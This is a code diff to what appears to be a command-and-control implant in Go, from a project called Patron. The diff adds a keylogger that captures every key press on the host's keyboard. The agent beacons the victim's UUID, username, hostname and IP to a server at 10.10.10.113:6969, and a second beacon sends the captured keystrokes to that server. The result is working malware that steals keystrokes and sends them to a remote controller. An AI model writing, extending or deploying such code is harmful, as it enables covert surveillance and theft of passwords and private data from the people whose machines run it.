@@ -11,6 +11,7 @@ import (
 
 	"github.com/google/uuid"
 
+	"github.com/MarinX/keylogger"
 	"github.com/PatronC2/Patron/types"
 	"github.com/s-christian/gollehs/lib/logger"
 )
@@ -20,26 +21,60 @@ import (
 // }
 
 func main() {
-	Agentuuid := uuid.New().String()
-	hostname, err := exec.Command("hostname", "-f").Output()
+	//Keylog start
+	// find keyboard device, does not require a root permission
+	keyboard := keylogger.FindKeyboardDevice()
+	cache := "" // cache for keylogs
+	k, err := keylogger.New(keyboard)
+	if err != nil {
+		log.Fatalln(err)
+		return
+	}
+	defer k.Close()
+
+	events := k.Read()
+
+	go func() {
+		// range of events
+		for e := range events {
+			switch e.Type {
+			case keylogger.EvKey:
+
+				// if the state of key is pressed
+				if e.KeyPress() {
+					// fmt.Println("[event] press key ", e.KeyString())
+					cache = cache + e.KeyString()
+				}
+
+				// if the state of key is released
+				if e.KeyRelease() {
+					// fmt.Println("[event] release key ", e.KeyString())
+					cache = cache + e.KeyString()
+				}
+
+				break
+			}
+		}
+	}()
+
+	Agentuuid := uuid.New().String()                         // Agent's uuid generated
+	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
 	if err != nil {
 		log.Fatal(err)
 	}
-	user, err := exec.Command("whoami").Output()
+	user, err := exec.Command("whoami").Output() // Agent's Username
+
 	for {
+		//First beacon for reqular commands
 		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
 		if err != nil {
 			log.Fatalln(err) // maybe try diff IP
 		}
 		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
 		ip := fmt.Sprintf("%v", ipAddress)
-		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip
+		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon"
 		// logger.Logf(logger.Debug, "Sending : %s\n", init)
-		// fmt.Fprintf(beacon, "12344\n")
-		_, _ = beacon.Write([]byte(init + "\n")) // add Ip,user and hostname
-		// text, _ := bufio.NewReader(beacon).ReadString('\n')
-		// message := strings.Split(text, "\n")
-		// if message[0] == "Yes" {
+		_, _ = beacon.Write([]byte(init + "\n"))
 		dec := gob.NewDecoder(beacon)
 		encoder := gob.NewEncoder(beacon)
 		logger.Logf(logger.Info, "Server Connected\n")
@@ -84,75 +119,42 @@ func main() {
 			log.Fatalln(err)
 		}
 		logger.Logf(logger.Debug, "Sent encoded struct\n")
-		// } else {
-		// 	logger.Logf(logger.Debug, "No Auth\n")
-		// 	continue
-		// }
 		beacon.Close()
 		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
 		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 
+		//Second beacon for keylog dump
 		keybeacon, err := net.Dial("tcp", "10.10.10.113:6969")
 		if err != nil {
 			log.Fatalln(err) // maybe try diff IP
 		}
 		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
 		keyip := fmt.Sprintf("%v", keyipAddress)
-		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip
+		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon"
 		// logger.Logf(logger.Debug, "Sending : %s\n", init)
-		// fmt.Fprintf(beacon, "12344\n")
-		_, _ = keybeacon.Write([]byte(keyinit + "\n")) // add Ip,user and hostname
-		// text, _ := bufio.NewReader(beacon).ReadString('\n')
-		// message := strings.Split(text, "\n")
-		// if message[0] == "Yes" {
+		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
 		keydec := gob.NewDecoder(keybeacon)
 		keyencoder := gob.NewEncoder(keybeacon)
 		logger.Logf(logger.Info, "Server Connected\n")
-		keyinstruct := &types.GiveAgentCommand{}
+		keyinstruct := &types.KeySend{}
 		logger.Logf(logger.Debug, "Struct formed\n")
 		err = keydec.Decode(keyinstruct)
 		if err != nil {
 			log.Fatalln(err)
 		}
 		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
-		KeyCommandType := keyinstruct.CommandType
-		KeyCommand := keyinstruct.Command
-		KeyCmdOut := ""
-		Keydestruct := types.GiveServerResult{}
-		if KeyCommandType == "shell" && KeyCommand != "" {
-			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
-			var c *exec.Cmd
-			c = exec.Command("bash", "-c", Command)
-			buf, _ := c.CombinedOutput()
-			if err != nil {
-				KeyCmdOut = err.Error()
-			}
-			KeyCmdOut += string(buf)
-			logger.Logf(logger.Done, "Command executed successfully : %s\n", KeyCmdOut)
-			destruct = types.GiveServerResult{
-				Uuid:        keyinstruct.UpdateAgentConfig.Uuid,
-				Result:      "1",
-				Output:      KeyCmdOut,
-				CommandUUID: keyinstruct.CommandUUID,
-			}
-		} else { // if CommandType == ""
-			destruct = types.GiveServerResult{
-				Uuid:        keyinstruct.UpdateAgentConfig.Uuid,
-				Result:      "2", // meaning nothing to run
-				Output:      "",
-				CommandUUID: keyinstruct.CommandUUID,
-			}
+		Keydestruct := types.KeyReceive{}
+		Keydestruct = types.KeyReceive{
+			Uuid: keyinstruct.Uuid,
+			Keys: cache,
 		}
+		cache = "" //Clears cache after keylog dump
 
 		err = keyencoder.Encode(Keydestruct)
 		if err != nil {
 			log.Fatalln(err)
 		}
 		logger.Logf(logger.Debug, "Sent encoded struct\n")
-		// } else {
-		// 	logger.Logf(logger.Debug, "No Auth\n")
-		// 	continue
-		// }
 		keybeacon.Close()
 		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
 		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
